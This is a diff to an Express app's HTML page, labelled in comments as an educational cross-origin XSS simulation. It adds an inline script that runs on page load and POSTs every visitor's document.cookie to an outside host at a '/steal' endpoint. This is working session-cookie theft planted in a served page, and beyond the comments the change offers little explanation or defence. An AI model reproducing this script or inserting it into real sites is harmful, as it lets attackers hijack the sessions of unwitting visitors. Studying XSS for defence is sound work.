@@ -1,12 +1,39 @@
+<!-- 
+
+**Educational purpose only**
+
+Cross Origin XSS
+
+To make this work the website should have a vulnerability that enables script injection
+ (Website insecure)
+-->
 <!DOCTYPE html>
 <html>
+
+<!-- Simulation: 
+Step 1: 
+A malicious actor inject the website with a malicious script that steals each visitor session cookies (Current state)
+
+Step 2:
+For each visitor that visits the website, the script is activated
+-->
 
 <head>
     <title>Express App</title>
 </head>
 
 <body>
-    <h1>Hello from Express!</h1>
+    <h1>Website Content</h1>
+    <script>
+        // Malicious script loaded
+        fetch('http://example.webste.com/steal', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ cookies: document.cookie })
+        });
+    </script>
 </body>
 
 </html>
